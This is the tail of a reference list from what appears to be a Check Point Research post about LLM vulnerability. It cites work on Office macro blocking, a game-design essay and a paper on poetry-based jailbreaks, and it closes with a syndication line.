\[17\] B. Herzog, “The Death of ‘Please Enable Macros’ and What it Means.” \[Online\]. Available: [https://research.checkpoint.com/2022/the-death-of-please-enable-macros-and-what-it-means/](https://research.checkpoint.com/2022/the-death-of-please-enable-macros-and-what-it-means/)

\[18\] K. Eickmeyer, “Helping Users Stay Safe: Blocking Internet Macros by Default in Office.” \[Online\]. Available: [https://techcommunity.microsoft.com/blog/microsoft_365blog/helping-users-stay-safe-blocking-internet-macros-by-default-in-office/3071805](https://techcommunity.microsoft.com/blog/microsoft_365blog/helping-users-stay-safe-blocking-internet-macros-by-default-in-office/3071805)

\[19\] P. Bisconti et al., “Adversarial Poetry as a Universal Single-Turn Jailbreak Mechanism in Large Language Models,” *arXiv preprint arXiv:2511.15304*, 2025.

\[20\] F. Lantz, “Donkeyspace.” \[Online\]. Available: [https://gamedesignadvance.com/?p=2346](https://gamedesignadvance.com/?p=2346)

The post [30 Years of Gatekeeper Asymmetry Doom: The Paradox that Makes Powerful LLMs More Vulnerable](https://research.checkpoint.com/2026/30-years-of-gatekeeper-asymmetry-doom-the-paradox-that-makes-powerful-llms-more-vulnerable/) appeared first on [Check Point Research](https://research.checkpoint.com/).
